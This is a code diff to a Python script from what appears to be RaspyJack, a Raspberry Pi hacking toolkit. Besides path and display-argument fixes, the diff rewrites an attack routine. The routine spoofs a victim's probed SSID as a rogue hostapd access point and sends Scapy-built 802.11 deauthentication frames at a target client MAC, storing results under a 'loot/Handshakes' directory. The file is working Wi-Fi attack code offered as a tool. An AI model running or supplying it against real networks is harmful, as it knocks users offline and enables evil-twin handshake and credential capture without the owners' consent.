@@ -39,7 +39,7 @@ import time
 import signal
 import subprocess
 import threading
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))) # Add parent directory for monitor_mode_helper
 
 import RPi.GPIO as GPIO
@@ -55,7 +55,7 @@ import monitor_mode_helper
 WIFI_INTERFACE = None
 ORIGINAL_WIFI_INTERFACE = None
 TARGET_CLIENT_MAC = "AA:BB:CC:DD:EE:FF"
-LOOT_DIR = os.path.join(os.path.abspath(os.path.join(__file__, '..', '..')), "loot", "Handshakes")
+LOOT_DIR = os.path.join(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')), "loot", "Handshakes")
 
 # Load PINS from RaspyJack gui_conf.json
 PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
@@ -190,7 +190,7 @@ def select_interface_menu():
         elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
             last_button_press_time = current_time
             selected_iface = available_interfaces[current_menu_selection]
-            draw_message([f"Activating monitor", f"mode on {selected_iface}...", "yellow"])
+            draw_message([f"Activating monitor", f"mode on {selected_iface}..."], "yellow")
             print(f"Attempting to activate monitor mode on {selected_iface}...", file=sys.stderr)
             
             ORIGINAL_WIFI_INTERFACE = selected_iface # Store original interface before activation
@@ -303,11 +303,23 @@ def run_attack():
         status_msg = "No probes found."
         return
 
-    rogue_ap_cmd = f"hostapd -C 'interface={WIFI_INTERFACE}\ndriver=nl80211\nssid={probed_ssid}\nhw_mode=g\nchannel=6\n'"
-    attack_procs['hostapd'] = subprocess.Popen(rogue_ap_cmd, shell=True)
-    
+    # Create a minimal hostapd config to spoof the probed SSID
+    temp_dir = "/tmp/raspyjack_known_deauth"
+    os.makedirs(temp_dir, exist_ok=True)
+    hostapd_conf_path = os.path.join(temp_dir, "hostapd.conf")
+    with open(hostapd_conf_path, "w") as f:
+        f.write(f"interface={WIFI_INTERFACE}\n")
+        f.write("driver=nl80211\n")
+        f.write(f"ssid={probed_ssid}\n")
+        f.write("hw_mode=g\n")
+        f.write("channel=6\n")
+
+    attack_procs['hostapd'] = subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(2)
+
     status_msg = f"Deauthing {TARGET_CLIENT_MAC}"
-    deauth_pkt = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=TARGET_CLIENT_MAC, addr3=TARGET_CLIENT_MAC)/Dot11Deauth(reason=7)
+    ap_bssid = RandMAC()
+    deauth_pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=TARGET_CLIENT_MAC, addr2=ap_bssid, addr3=ap_bssid)/Dot11Deauth(reason=7)
     
     end_time = time.time() + 30
     while time.time() < end_time and running:
